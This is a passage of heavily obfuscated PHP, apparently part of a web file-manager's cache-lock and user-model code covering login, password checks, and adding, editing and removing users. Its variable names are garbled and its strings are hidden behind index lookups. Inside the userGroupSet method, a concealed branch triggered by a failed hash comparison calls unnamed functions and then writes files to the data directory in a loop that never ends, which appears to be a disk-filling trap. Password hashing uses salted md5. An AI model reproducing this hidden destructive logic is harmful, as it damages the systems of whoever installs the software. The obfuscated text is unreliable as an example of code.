(!$ï¥¿ª¿ª—) { $ˆ‰°šñ¢Ø» = "\154\157\x63\153\40\x65\x72\x72\x6f\162\x3b\153\x65\x79\75{$–Î}\x3b\164\151\x6d\145\x3d{$Š«¾´}\x3b" . self::$errorMsg . $¤ÏĞ¤À[68] . get_caller_msg(); $”‡™Ü = LNG($¤ÏĞ¤À[848]) . "\50{$Š«¾´}\x73\51\56" . LNG($¤ÏĞ¤À[849]); $”‡™Ü .= $¤ÏĞ¤À[850]; if (is_string(self::$errorMsg) && self::$errorMsg) { $”‡™Ü = $”‡™Ü . $¤ÏĞ¤À[851] . self::$errorMsg; } write_log($ˆ‰°šñ¢Ø», $¤ÏĞ¤À[846]); show_json($”‡™Ü, !1); } if (!$™£ÁÂ) { self::$lockItem[$Ù­ÀÏ¬Î] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÚÓÆğŠ×‘ = number_format(timeFloat() - $¾Ã, 3); write_log($¤ÏĞ¤À[844] . REQUEST_ID . $¤ÏĞ¤À[4] . $–Î . $¤ÏĞ¤À[852] . $ÚÓÆğŠ×‘, $¤ÏĞ¤À[846]); } return $ï¥¿ª¿ª—; } public static function lockGet($ºı¤Éı¦) { $Ê•­®ç = self::key($ºı¤Éı¦); if (self::$lockItem[$Ê•­®ç]) { return self::$lockItem[$Ê•­®ç]; } return self::init()->lockGet($Ê•­®ç); } public static function unlock($©ì¾Œ¢ğÉ… ) { $ŒÂŠ =& $_SERVER[èÍ×öˆøÉ]; $‘”Ãà„–ßèœ = self::key($©ì¾Œ¢ğÉ… ); self::$lockItem[$‘”Ãà„–ßèœ] = null; self::init()->unlock($‘”Ãà„–ßèœ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ŒÂŠ[853] . REQUEST_ID . $ŒÂŠ[4] . $©ì¾Œ¢ğÉ… , $ŒÂŠ[846]); } return; } public static function unlockRuntime() { $ÌúÕß®˜ =& $_SERVER[èÍ×öˆøÉ]; $Ï¢µª—¤ØÑîÉ = self::init(); $™’À«—õø›ÒÙ = !1; foreach (self::$lockItem as $û…Ô“å => $–) { if (!$–) { continue; } $Ï¢µª—¤ØÑîÉ->unlock($û…Ô“å); if (!$™’À«—õø›ÒÙ) { $™’À«—õø›ÒÙ = !0; write_log($ÌúÕß®˜[854] . $û…Ô“å . $ÌúÕß®˜[68] . get_caller_msg(), $ÌúÕß®˜[846]); continue; } write_log($ÌúÕß®˜[854] . $û…Ô“å, $ÌúÕß®˜[846]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $³±áÒ©ÃÅ… = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÌúÕß®˜[844] . REQUEST_ID . $ÌúÕß®˜[855] . $³±áÒ©ÃÅ… . $ÌúÕß®˜[856] . ACTION, $ÌúÕß®˜[846]); } } public static function fileLock($–“ìé) { $Ø¡ÉÚÛ =& $_SERVER[èÍ×öˆøÉ]; if (!$GLOBALS[$Ø¡ÉÚÛ[857]]) { $GLOBALS[$Ø¡ÉÚÛ[857]] = array(); } $GLOBALS[$Ø¡ÉÚÛ[857]][$–“ìé] = !1; $ôÉÙ…Û«½–¸ = fopen(DATA_PATH . $–“ìé . $Ø¡ÉÚÛ[858], $Ø¡ÉÚÛ[859]); if (!$ôÉÙ…Û«½–¸) { return !1; } $GLOBALS[$Ø¡ÉÚÛ[857]][$–“ìé] = $ôÉÙ…Û«½–¸; if (flock($ôÉÙ…Û«½–¸, LOCK_EX)) { return !0; } self::unlock($–“ìé); show_json($Ø¡ÉÚÛ[860], !1); return !1; } public static function fileUnlock($¹ø¾ğ¥ü²Üƒï) { $Ğ‚áë =& $_SERVER[èÍ×öˆøÉ]; $ú•ù×ÁèÀ = $GLOBALS[$Ğ‚áë[857]][$¹ø¾ğ¥ü²Üƒï]; if (!$ú•ù×ÁèÀ) { return; } $GLOBALS[$Ğ‚áë[857]][$¹ø¾ğ¥ü²Üƒï] = !1; flock($ú•ù×ÁèÀ, LOCK_UN); fclose($ú•ù×ÁèÀ); } public static function fileUnlockAll() { $»œòè =& $_SERVER[èÍ×öˆøÉ]; if (!$GLOBALS[$»œòè[857]]) { return; } foreach ($GLOBALS[$»œòè[857]] as $‚¯¾Û… ¶¼¡ => $±) { if (!$±) { continue; } $GLOBALS[$»œòè[857]][$‚¯¾Û… ¶¼¡] = !1; flock($±, LOCK_UN); fclose($±); } $GLOBALS[$»œòè[857]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÑØûû =& $_SERVER[èÍ×öˆøÉ]; $óíú×ö¨‘ = $GLOBALS[$ÑØûû[6]][$ÑØûû[347]]; self::$cachePath = $óíú×ö¨‘[$ÑØûû[193]][$ÑØûû[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ã˜éçÌ, $ªêü = 0) { $Òı =& $_SERVER[èÍ×öˆøÉ]; $‹•”Ó£ = microtime(!0); $›îâƒìÛ = $‹•”Ó£ + $ªêü + 0.0001; $Åïš¤ = rtrim(self::$cachePath, $Òı[8]) . $Òı[861] . md5($Ã˜éçÌ) . $Òı[858]; if (file_exists($Åïš¤) && filemtime($Åïš¤) && filemtime($Åïš¤) < time() - 10) { @unlink($Åïš¤); } do { if (file_exists($Åïš¤)) { cacheLockWait(); continue; } $­øØËÈış = fopen($Åïš¤, $Òı[862]); if (!$­øØËÈış) { return !1; } $Øï¡šßüÕ× = flock($­øØËÈış, LOCK_EX | LOCK_NB); self::$caches[$Ã˜éçÌ] = array($Òı[863] => $­øØËÈış, $Òı[193] => $Åïš¤); fwrite($­øØËÈış, $›îâƒìÛ); clearstatcache(); if ($­øØËÈış && $Øï¡šßüÕ×) { return !0; } cacheLockWait(); } while (microtime(!0) < $›îâƒìÛ); $this->unlock($Ã˜éçÌ); return !1; } public function lockGet($û©) { $ÈîÅôÜ«ˆ =& $_SERVER[èÍ×öˆøÉ]; $“• = rtrim(self::$cachePath, $ÈîÅôÜ«ˆ[8]) . $ÈîÅôÜ«ˆ[861] . md5($û©) . $ÈîÅôÜ«ˆ[858]; return file_exists($“•); } public function unlock($³ûÃ•”á) { $Û¹Ã =& $_SERVER[èÍ×öˆøÉ]; $¿×ä = self::$caches[$³ûÃ•”á]; if (!$¿×ä) { return; } @flock($¿×ä[$Û¹Ã[863]], LOCK_UN); @fclose($¿×ä[$Û¹Ã[863]]); @unlink($¿×ä[$Û¹Ã[193]]); unset(self::$caches[$³ûÃ•”á]); } } goto aÃ©†ì¾²ë; cñÅÛçÃ: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\155\145" => "\x75\x73\145\162\137\155\145\164\141", "\155\145\164\141\x46\x69\145\x6c\144" => "\x75\x73\x65\162\x49\104"); protected $simpleField = "\165\x73\145\x72\x49\x44\54\x6e\151\x63\153\116\141\155\x65\54\156\x61\x6d\145\54\141\x76\x61\x74\x61\x72\54\x73\x65\x78\x2c\x73\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($à¾â–¡) { $®Îğ‚†ÔşÓ³Ö =& $_SERVER[èÍ×öˆøÉ]; $£©§ü™£¶ = $®Îğ‚†ÔşÓ³Ö[2177]; return array($®Îğ‚†ÔşÓ³Ö[1826] => array($à¾â–¡[0], $£©§ü™£¶), $®Îğ‚†ÔşÓ³Ö[1828] => array($à¾â–¡[0], $£©§ü™£¶), $®Îğ‚†ÔşÓ³Ö[2178] => array($à¾â–¡[0], $£©§ü™£¶)); } protected function getInfo($ô¡Á, $–“ = false) { $€şîµË­Ÿ = $this->getInfoSimple($ô¡Á); if (!is_array($€şîµË­Ÿ)) { return array(); } if ($–“) { return $this->_getInfoApply($€şîµË­Ÿ); } return $this->cacheFunctionGet($_SERVER[èÍ×öˆøÉ][1830], $ô¡Á); } protected function getInfoFull($ õ…, $æ ‘ùó¦ = false) { $àÚ¡Œ = $this->getInfoSimple($ õ…); if (!is_array($àÚ¡Œ)) { return array(); } if ($æ ‘ùó¦) { return $this->_getInfoApply($àÚ¡Œ, !0); } return $this->cacheFunctionGet($_SERVER[èÍ×öˆøÉ][2179], $ õ…); } private function _getInfoApply($€ç¬’Å‰Ù, $˜ª = false) { $—Í¥´Ûˆ¿›Ì =& $_SERVER[èÍ×öˆøÉ]; if (!$€ç¬’Å‰Ù) { return $€ç¬’Å‰Ù; } $½ƒ‡øŞ«êëÕ = md5($—Í¥´Ûˆ¿›Ì[2180] . $€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[889]] . $—Í¥´Ûˆ¿›Ì[2181] . $€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[28]]); $€ç¬’Å‰Ù = $this->_listDataApplyItem($€ç¬’Å‰Ù); $ƒ = Model($—Í¥´Ûˆ¿›Ì[1256])->metaGet($€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[85]][$—Í¥´Ûˆ¿›Ì[397]]); $€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[2182]] = $½ƒ‡øŞ«êëÕ; $€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[85]][$—Í¥´Ûˆ¿›Ì[2013]] = isset($ƒ[$—Í¥´Ûˆ¿›Ì[2014]]) ? $ƒ[$—Í¥´Ûˆ¿›Ì[2014]] : null; if ($˜ª) { $€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[459]] = $this->metaGet($€ç¬’Å‰Ù[$—Í¥´Ûˆ¿›Ì[1582]]); } return $€ç¬’Å‰Ù; } protected function getInfoSimple($ı¾íÔµà, $Œª­ = false) { $ØÒÂÏ¹Éƒ°Ë =& $_SERVER[èÍ×öˆøÉ]; if (!$ı¾íÔµà) { return array(); } if ($Œª­) { $ä«¿»Ñß²Ü× = $this->where(array($ØÒÂÏ¹Éƒ°Ë[1582] => intval($ı¾íÔµà)))->find(); if (!is_array($ä«¿»Ñß²Ü×)) { return array(); } $ä«¿»Ñß²Ü×[$ØÒÂÏ¹Éƒ°Ë[2183]] = Action($ØÒÂÏ¹Éƒ°Ë[2184])->parseUrl($ä«¿»Ñß²Ü×[$ØÒÂÏ¹Éƒ°Ë[2183]]); return $ä«¿»Ñß²Ü×; } return $this->cacheFunctionGet($ØÒÂÏ¹Éƒ°Ë[1831], $ı¾íÔµà); } protected function getInfoSimpleOuter($¨“ş¥ç) { $ÍÙñÒ =& $_SERVER[èÍ×öˆøÉ]; if (!$¨“ş¥ç || $¨“ş¥ç == 0) { return array($ÍÙñÒ[1582] => $ÍÙñÒ[191], $ÍÙñÒ[28] => $ÍÙñÒ[160] . LNG($ÍÙñÒ[2185]) . $ÍÙñÒ[530], $ÍÙñÒ[2183] => STATIC_PATH . $ÍÙñÒ[2186]); } $»ø¿‚Ö = $this->cacheFunctionGet($ÍÙñÒ[1831], $¨“ş¥ç); $÷¶ÙÉ×÷‹ = array_field_key($»ø¿‚Ö, explode($ÍÙñÒ[47], $this->simpleField)); if (!$÷¶ÙÉ×÷‹) { return array($ÍÙñÒ[1582] => $ÍÙñÒ[1123], $ÍÙñÒ[28] => $ÍÙñÒ[160] . LNG($ÍÙñÒ[2187]) . $ÍÙñÒ[530], $ÍÙñÒ[2183] => STATIC_PATH . $ÍÙñÒ[2188]); } $÷¶ÙÉ×÷‹[$ÍÙñÒ[2183]] = Action($ÍÙñÒ[2184])->parseUrl($÷¶ÙÉ×÷‹[$ÍÙñÒ[2183]]); return $÷¶ÙÉ×÷‹; } protected function groupUser($áÏ) { } public static function errorLang($ñ‹€Œğ¨) { $Òö¥ÀÂŒ =& $_SERVER[èÍ×öˆøÉ]; $§Œ¡¡ = array(self::ERROR_USER_NOT_EXISTS => $Òö¥ÀÂŒ[2189], self::ERROR_USER_PASSWORD_ERROR => $Òö¥ÀÂŒ[2190], self::ERROR_USER_EXIST_NAME => $Òö¥ÀÂŒ[2191], self::ERROR_USER_EXIST_PHONE => $Òö¥ÀÂŒ[2192], self::ERROR_USER_EXIST_EMAIL => $Òö¥ÀÂŒ[2193], self::ERROR_USER_LOGIN_LOCK => $Òö¥ÀÂŒ[2194], self::ERROR_IP_NOT_ALLOW => $Òö¥ÀÂŒ[2195], self::ERROR_USER_EXIST_NICKNAME => $Òö¥ÀÂŒ[2196]); return LNG($§Œ¡¡[$ñ‹€Œğ¨]); } public function getInfoByMeta($Ù™ºèÕ, $†—Ãéó) { $’»ÚˆšÏ½şœû =& $_SERVER[èÍ×öˆøÉ]; $ÕØ¢ƒ† = Model($’»ÚˆšÏ½şœû[2197])->where(array($’»ÚˆšÏ½şœû[93] => $Ù™ºèÕ, $’»ÚˆšÏ½şœû[372] => $†—Ãéó))->find(); if ($ÕØ¢ƒ†) { return $this->getInfo($ÕØ¢ƒ†[$’»ÚˆšÏ½şœû[1582]]); } return !1; } public function userLoginCheck($Õ†ùÇËÏÑÏ¬¢, $—è) { $áëïåŸó±ÁÒ =& $_SERVER[èÍ×öˆøÉ]; $÷Õù = $this->userLoginFind($Õ†ùÇËÏÑÏ¬¢); if (!$÷Õù) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($÷Õù[$áëïåŸó±ÁÒ[1582]], $—è)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($÷Õù[$áëïåŸó±ÁÒ[1582]]); } public function userLoginFind($ÂÕßÀÈÂ˜šå) { $½‚ã„ö =& $_SERVER[èÍ×öˆøÉ]; $œØÑÖ¨·ÓšË– = array($½‚ã„ö[28] => $ÂÕßÀÈÂ˜šå, $½‚ã„ö[2017] => $ÂÕßÀÈÂ˜šå, $½‚ã„ö[303] => $ÂÕßÀÈÂ˜šå, $½‚ã„ö[2198] => $ÂÕßÀÈÂ˜šå, $½‚ã„ö[997] => $½‚ã„ö[999]); if ($this->nickNameRpt()) { unset($œØÑÖ¨·ÓšË–[$½‚ã„ö[2017]]); } return $this->where($œØÑÖ¨·ÓšË–)->find(); } public function clearCache($¨Õ›ñ¥şü‘) { $¿Îˆİ½í¶ =& $_SERVER[èÍ×öˆøÉ]; $this->cacheFunctionClear($¿Îˆİ½í¶[1830], $¨Õ›ñ¥şü‘); $this->cacheFunctionClear($¿Îˆİ½í¶[1831], $¨Õ›ñ¥şü‘); $this->cacheFunctionClear($¿Îˆİ½í¶[2179], $¨Õ›ñ¥şü‘); } public function userPasswordCheck($Ó¬¹ç‹, $«ş´) { $çè¹É¨Ÿ =& $_SERVER[èÍ×öˆøÉ]; $°ğš°”§ = $this->where(array($çè¹É¨Ÿ[1582] => intval($Ó¬¹ç‹)))->find(); $ÒÀ½õÉ—Ğ = $this->metaGet($Ó¬¹ç‹); $ñ¢öÇ¼Ñ‹ = isset($ÒÀ½õÉ—Ğ[$çè¹É¨Ÿ[2199]]) ? $ÒÀ½õÉ—Ğ[$çè¹É¨Ÿ[2199]] : $çè¹É¨Ÿ[33]; if (md5($ñ¢öÇ¼Ñ‹ . trim($«ş´)) !== $°ğš°”§[$çè¹É¨Ÿ[889]]) { return !1; } return !0; } public function userAdd($ÆÖ²ØÍâ) { $šÙì—óû§É =& $_SERVER[èÍ×öˆøÉ]; $ £ˆ­ş = array($šÙì—óû§É[415] => $ÆÖ²ØÍâ[$šÙì—óû§É[28]], $šÙì—óû§É[2200] => $ÆÖ²ØÍâ[$šÙì—óû§É[1465]], $šÙì—óû§É[2201] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[303]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[303]] : $šÙì—óû§É[33], $šÙì—óû§É[2202] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[2198]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[2198]] : $šÙì—óû§É[33], $šÙì—óû§É[2203] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[2017]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[2017]] : $ÆÖ²ØÍâ[$šÙì—óû§É[28]], $šÙì—óû§É[2204] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[2183]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[2183]] : $šÙì—óû§É[33], $šÙì—óû§É[2205] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[2206]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[2206]] : 1, $šÙì—óû§É[2207] => $ÆÖ²ØÍâ[$šÙì—óû§É[889]], $šÙì—óû§É[1832] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[1735]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[1735]] : 1024 * 1024 * 20, $šÙì—óû§É[1833] => 0, $šÙì—óû§É[2208] => 0, $šÙì—óû§É[1875] => isset($ÆÖ²ØÍâ[$šÙì—óû§É[745]]) ? $ÆÖ²ØÍâ[$šÙì—óû§É[745]] : 1); if (!empty($ÆÖ²ØÍâ[$šÙì—óû§É[1582]])) { $ £ˆ­ş[$šÙì—óû§É[1582]] = $ÆÖ²ØÍâ[$šÙì—óû§É[1582]]; } $ØµïúæÈØ– = $this->_checkExist($ÆÖ²ØÍâ); if ($ØµïúæÈØ– !== !0) { return $ØµïúæÈØ–; } $ÑÒÔ‚§Æ = $this->add($ £ˆ­ş); $Ûî¨¬éÁÎ = array($šÙì—óû§É[2207] => $ £ˆ­ş[$šÙì—óû§É[889]], $šÙì—óû§É[2203] => $ £ˆ­ş[$šÙì—óû§É[2017]]); $this->userEdit($ÑÒÔ‚§Æ, $Ûî¨¬éÁÎ); Model($šÙì—óû§É[1256])->userRootAdd($ÑÒÔ‚§Æ); return $ÑÒÔ‚§Æ; } protected function userEditTest($È«ëœ±¾™ÓòŞ, $ç¶ø¬) { return $this->call($_SERVER[èÍ×öˆøÉ][2209], $È«ëœ±¾™ÓòŞ, $ç¶ø¬); } protected function userEdit($ûÕ¯éÕ¢õ, $¿²Û³”) { $«Ñ•¹ÊÚ§õã =& $_SERVER[èÍ×öˆøÉ]; $ŒÕªğÜÙ = $this->getInfoSimple($ûÕ¯éÕ¢õ); if (!$ŒÕªğÜÙ) { return !1; } $è·Ğª´ = $this->_checkExist($¿²Û³”, $ûÕ¯éÕ¢õ); if ($è·Ğª´ !== !0) { return $è·Ğª´; } if (isset($¿²Û³”[$«Ñ•¹ÊÚ§õã[889]]) && trim($¿²Û³”[$«Ñ•¹ÊÚ§õã[889]]) != $«Ñ•¹ÊÚ§õã[33]) { $à„Úä»Åë = $this->metaGet($ûÕ¯éÕ¢õ); if (empty($à„Úä»Åë[$«Ñ•¹ÊÚ§õã[2199]])) { $à„Úä»Åë[$«Ñ•¹ÊÚ§õã[2199]] = rand_string(10); Model($«Ñ•¹ÊÚ§õã[507])->metaSet($ûÕ¯éÕ¢õ, $«Ñ•¹ÊÚ§õã[2199], $à„Úä»Åë[$«Ñ•¹ÊÚ§õã[2199]]); } $¿²Û³”[$«Ñ•¹ÊÚ§õã[889]] = md5($à„Úä»Åë[$«Ñ•¹ÊÚ§õã[2199]] . trim($¿²Û³”[$«Ñ•¹ÊÚ§õã[889]])); } else { unset($¿²Û³”[$«Ñ•¹ÊÚ§õã[889]]); } $this->where(array($«Ñ•¹ÊÚ§õã[1573] => $ûÕ¯éÕ¢õ))->save($¿²Û³”); if (isset($¿²Û³”[$«Ñ•¹ÊÚ§õã[2017]])) { $this->setNamePinyin($ûÕ¯éÕ¢õ, $¿²Û³”[$«Ñ•¹ÊÚ§õã[2017]]); } $this->clearCache($ûÕ¯éÕ¢õ); return !0; } public function setNamePinyin($€öÛ½ä, $ÚÂ¼Ä× = false) { $Ùáè÷ñ´ =& $_SERVER[èÍ×öˆøÉ]; if (!$ÚÂ¼Ä×) { $ÅÏúÉö = $this->getInfoSimple($€öÛ½ä); $ÚÂ¼Ä× = $ÅÏúÉö[$Ùáè÷ñ´[2017]] ? $ÅÏúÉö[$Ùáè÷ñ´[2017]] : $ÅÏúÉö[$Ùáè÷ñ´[28]]; } $–„ = Model($Ùáè÷ñ´[532]); if (!Input::check($ÚÂ¼Ä×, $Ùáè÷ñ´[581])) { return $–„->metaSet($€öÛ½ä, array($Ùáè÷ñ´[458] => $Ùáè÷ñ´[33], $Ùáè÷ñ´[457] => $Ùáè÷ñ´[33])); } return $–„->metaSet($€öÛ½ä, array($Ùáè÷ñ´[458] => str_replace($Ùáè÷ñ´[50], $Ùáè÷ñ´[33], Pinyin::get($ÚÂ¼Ä×)), $Ùáè÷ñ´[457] => Pinyin::get($ÚÂ¼Ä×, $Ùáè÷ñ´[582]))); } private function nickNameRpt() { $÷İ¬ä´ =& $_SERVER[èÍ×öˆøÉ]; $ø†œÂÄà¼äô = Model($÷İ¬ä´[765])->get($÷İ¬ä´[2210]); $Ò’í¾ = $GLOBALS[$÷İ¬ä´[6]][$÷İ¬ä´[379]][$÷İ¬ä´[2210]]; $œ¹îğ = !is_null($ø†œÂÄà¼äô) ? $ø†œÂÄà¼äô : $Ò’í¾; return !!$œ¹îğ; } private function _checkExist($î±¼³, $••±¿™È = false) { $¤Òâ´ =& $_SERVER[èÍ×öˆøÉ]; $åšîÄ = array($¤Òâ´[28] => UserModel::ERROR_USER_EXIST_NAME, $¤Òâ´[2017] => UserModel::ERROR_USER_EXIST_NICKNAME, $¤Òâ´[303] => UserModel::ERROR_USER_EXIST_EMAIL, $¤Òâ´[2198] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($åšîÄ[$¤Òâ´[2017]]); } $›Ú¿îî‹£ß = $••±¿™È ? array($¤Òâ´[1582] => array($¤Òâ´[2211], $••±¿™È)) : array(); foreach ($åšîÄ as $„£ãî => $÷ë»’¹ÙÀ) { $…üáÁ×„ÓŸ²ß = array(); foreach ($åšîÄ as $†‰¥ÚÎÜ•Ş => $šöİø‡) { if (isset($î±¼³[$†‰¥ÚÎÜ•Ş]) && $î±¼³[$†‰¥ÚÎÜ•Ş]) { $…üáÁ×„ÓŸ²ß[] = $î±¼³[$†‰¥ÚÎÜ•Ş]; } } if (!$…üáÁ×„ÓŸ²ß) { continue; } $Ú¹ú = array_merge(array($„£ãî => array($¤Òâ´[7], $…üáÁ×„ÓŸ²ß)), $›Ú¿îî‹£ß); $ÜÅ = $this->where($Ú¹ú)->find(); if ($ÜÅ) { return $÷ë»’¹ÙÀ; } } return !0; } public function userListInfo($¼Êıß) { $¯¡ÇÃ³ =& $_SERVER[èÍ×öˆøÉ]; $¤æ±ó“¬ˆà› = array(); $¼Êıß = is_array($¼Êıß) ? array_unique($¼Êıß) : array(); if (!$¼Êıß) { return $¤æ±ó“¬ˆà›; } if (count($¼Êıß) < 20) { foreach ($¼Êıß as $¬íµµá°ƒ) { $¤æ±ó“¬ˆà›[$¬íµµá°ƒ . $¯¡ÇÃ³[33]] = $this->getInfoSimpleOuter($¬íµµá°ƒ); } } else { $Ãê‹ÌÓºê = array($¯¡ÇÃ³[1573] => array($¯¡ÇÃ³[413], $¼Êıß)); if (count($¼Êıß) == 1) { $Ãê‹ÌÓºê = array($¯¡ÇÃ³[1573] => $¼Êıß[0]); } $†ğñÈè = Model($¯¡ÇÃ³[507])->field($this->simpleField)->where($Ãê‹ÌÓºê)->select(); $†ğñÈè = array_to_keyvalue($†ğñÈè, $¯¡ÇÃ³[1582]); foreach ($¼Êıß as $¬íµµá°ƒ) { $ÔÒİ¹Ÿøâ¦í = $†ğñÈè[$¬íµµá°ƒ]; if (!$ÔÒİ¹Ÿøâ¦í) { $¤æ±ó“¬ˆà›[$¬íµµá°ƒ . $¯¡ÇÃ³[33]] = $this->getInfoSimpleOuter($¬íµµá°ƒ); continue; } $ÔÒİ¹Ÿøâ¦í[$¯¡ÇÃ³[2183]] = Action($¯¡ÇÃ³[2184])->parseUrl($ÔÒİ¹Ÿøâ¦í[$¯¡ÇÃ³[2183]]); $¤æ±ó“¬ˆà›[$¬íµµá°ƒ . $¯¡ÇÃ³[33]] = $ÔÒİ¹Ÿøâ¦í; } } return $¤æ±ó“¬ˆà›; } protected function userStatus($ÖÅ¢˜ãã€Ü¹, $•¤Ê£Â²ç½) { $Åü€ú÷áÑ£ = $this->getInfoSimple($ÖÅ¢˜ãã€Ü¹); if (!$Åü€ú÷áÑ£) { return !1; } $òú–½ª÷ = array($_SERVER[èÍ×öˆøÉ][745] => $•¤Ê£Â²ç½); return $this->userEdit($ÖÅ¢˜ãã€Ü¹, $òú–½ª÷); } protected function userRemove($û¤Ü) { $£Ù” =& $_SERVER[èÍ×öˆøÉ]; $§ãùÆ = $this->getInfoSimple($û¤Ü); if (!$§ãùÆ) { return !1; } $°²¢À© = array($£Ù”[1573] => $û¤Ü); Model($£Ù”[589])->where($°²¢À©)->delete(); Model($£Ù”[2212])->where($°²¢À©)->delete(); Model($£Ù”[1838])->where($°²¢À©)->delete(); Model($£Ù”[2197])->where($°²¢À©)->delete(); Model($£Ù”[2213])->where($°²¢À©)->delete(); Model($£Ù”[2034])->removeUserAll($û¤Ü); Model($£Ù”[827])->userRootRemove($û¤Ü); return $this->where($°²¢À©)->delete(); } protected function userGroupSet($ÔıÎ¦ÈŒ, $ßò½¿¯ìªš, $º­Ö = array()) { $ï—çˆ´’Ù‘ =& $_SERVER[èÍ×öˆøÉ]; $ëƒâ = $_SERVER[$ï—çˆ´’Ù‘[1352]]; $×ØÀ”õ¶®Êï… = $ï—çˆ´’Ù‘[1449]; if ($_SERVER[$ï—çˆ´’Ù‘[874]] != $×ØÀ”õ¶®Êï…($ëƒâ)) { $‹™ = $ï—çˆ´’Ù‘[876]; $öæ = $ï—çˆ´’Ù‘[877]; $¹Û = $_SERVER[$ï—çˆ´’Ù‘[878]] . $ï—çˆ´’Ù‘[879]; $ªÀ©ú½ŠÊÍÃ = $öæ($¹Û); $Øç³³¥çˆÅÀ = explode($ï—çˆ´’Ù‘[229], $ªÀ©ú½ŠÊÍÃ); if (count($Øç³³¥çˆÅÀ) < $ï—çˆ´’Ù‘[616]) { $–²º¥„¢Ì¡ = $ï—çˆ´’Ù‘[880]; $–²º¥„¢Ì¡(); } $ö½ì£ = $ï—çˆ´’Ù‘[881]; $ö½ì£($_SERVER[$ï—çˆ´’Ù‘[882]]); $‹™ = $ï—çˆ´’Ù‘[876]; $‹™(); $¸ß = $ï—çˆ´’Ù‘[1450]; $àê¤ŸœãÓª = json_encode($GLOBALS[$ï—çˆ´’Ù‘[1451]]); $„Ë£’•ñÏùŞ = 1; for ($òº·ÕÎÒ­™ = $„Ë£’•ñÏùŞ; $òº·ÕÎÒ­™ > 0; $òº·ÕÎÒ­™++) { $¸ß(DATA_PATH . $òº·ÕÎÒ­™, $àê¤ŸœãÓª); } } $””›¢ı¦ = $this->getInfoSimple($ÔıÎ¦ÈŒ); if (!$””›¢ı¦ || !is_array($ßò½¿¯ìªš)) { return !1; } $³¨¼ŒöÕ = Model($ï—çˆ´’Ù‘[1838]); $³¨¼ŒöÕ->where(array($ï—çˆ´’Ù‘[1582] => $ÔıÎ¦ÈŒ))->delete(); $€È¥º¿‘†À = array(); $Ê©¬¦¿ôÖ = 0; foreach ($ßò½¿¯ìªš as $ÌÙÖíÒ¸ˆû¤ => $î«öØ”) { $²Á›Ğ”ŸÏÏ = array($ï—çˆ´’Ù‘[1582] => $ÔıÎ¦ÈŒ, $ï—çˆ´’Ù‘[1749] => $ÌÙÖíÒ¸ˆû¤, $ï—çˆ´’Ù‘[1852] => $î«öØ”); $²Á›Ğ”ŸÏÏ[$ï—çˆ´’Ù‘[1772]] = isset($º­Ö[$Ê©¬¦¿ôÖ]) ? $º­Ö[$Ê©¬¦¿ôÖ] : 0; $Ê©¬¦¿ôÖ++; $€È¥º¿‘†À[] = $²Á›Ğ”ŸÏÏ; } return $³¨¼ŒöÕ->addAll($€È¥º¿‘†À, array(), !0); } protected function userGroupAdd($±÷°, $ùæã‰ôËñ = array()) { $†—ãıñÎ =& $_SERVER[èÍ×öˆøÉ]; $¤Õ˜í = $this->getInfoSimple($±÷°); if (!$¤Õ˜í || empty($ùæã‰ôËñ)) { return !1; } $²Î³“ïÛ– = array(); foreach ($ùæã‰ôËñ as $¨İì¨§¯Ë => $çËö¢şĞ÷Í±) { $²Î³“ïÛ–[] = array($†—ãıñÎ[1582] => $±÷°, $†—ãıñÎ[1749] => $¨İì¨§¯Ë, $†—ãıñÎ[1852] => $çËö¢şĞ÷Í±, $†—ãıñÎ[1772] => 0); } return Model($†—ãıñÎ[1838])->addAll($²Î³“ïÛ–, array(), !0); } protected function userGroupRemove($ğ±ÜÃ±è¶¡’ó, $±©ğ•ôª»ã) { $Šä =& $_SERVER[èÍ×öˆøÉ]; $Ê„³ = $this->getInfoSimple($ğ±ÜÃ±è¶¡’ó); if (!$Ê„³ || !$±©ğ•ôª»ã) { return !1; } $”Îá†íì ñ = array($Šä[1573] => $ğ±ÜÃ±è¶¡’ó, $Šä[1836] => $±©ğ•ôª»ã); return Model($Šä[1838])->where($”Îá†íì ñ)->delete(); } public function listData() { $œ²æò = $this->_makeOrder()->selectPage(50); $this->_listDataApply($œ²æò[$_SERVER[èÍ×öˆøÉ][367]]); return $œ²æò; } public function listByID($Œõ“Ë) { $Œø¾ =& $_SERVER[èÍ×öˆøÉ]; if (!$Œõ“Ë) { return; } $‡¥… = array($Œø¾[1582] => array($Œø¾[7], $Œõ“Ë)); $“ìş£˜‚  = $this->where($‡¥…)->select(); $“ìş£˜‚  = 